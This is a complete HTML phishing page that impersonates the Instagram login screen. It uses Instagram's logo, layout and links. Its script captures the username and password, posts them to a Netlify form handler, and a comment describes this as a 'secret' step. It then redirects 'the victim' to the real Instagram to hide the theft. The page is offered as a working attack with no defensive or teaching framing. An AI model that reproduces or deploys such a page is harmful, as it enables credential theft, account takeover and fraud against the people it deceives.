<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login • Instagram</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0; min-height: 100vh; display: flex; justify-content: center;
      align-items: center; background: #fafafa; padding: 20px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    .card {
      background: #fff; border: 1px solid #dbdbdb; width: 350px;
      padding: 40px 40px 24px; text-align: center;
    }
    .logo { width: 175px; margin: 12px 0 30px; }
    input {
      width: 100%; padding: 10px 8px; margin-bottom: 6px; background: #fafafa;
      border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none;
    }
    input:focus { border-color: #a8a8a8; }
    button {
      width: 100%; margin-top: 8px; padding: 8px; background: #0095f6; color: #fff;
      border: none; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer;
    }
    button:disabled { opacity: .7; }
    .divider { display: flex; align-items: center; gap: 16px; margin: 20px 0; color: #8e8e8e; font-size: 12px; font-weight: 600; }
    .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
    .fb { color: #385185; font-weight: 600; font-size: 14px; }
    .forgot { display: block; margin-top: 16px; color: #00376b; font-size: 12px; text-decoration: none; }
  </style>
</head>
<body>
  <div class="card">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram">

    <!-- The magic line is data-netlify="true" -->
    <form id="loginForm" name="login" data-netlify="true">
      <input type="hidden" name="form-name" value="login">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" id="btn">Log in</button>
    </form>

    <div class="divider">OR</div>
    <div class="fb">Log in with Facebook</div>
    <a class="forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const btn = document.getElementById('btn');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();          // stop the normal page change
      btn.textContent = 'Logging in...';

      // 1. secretly send credentials to Netlify
      try {
        await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(new FormData(form)).toString()
        });
      } catch (err) {}

      // 2. forward the victim to the real Instagram
      window.location.href = 'https://www.instagram.com';
    });
  </script>
</body>
</html>
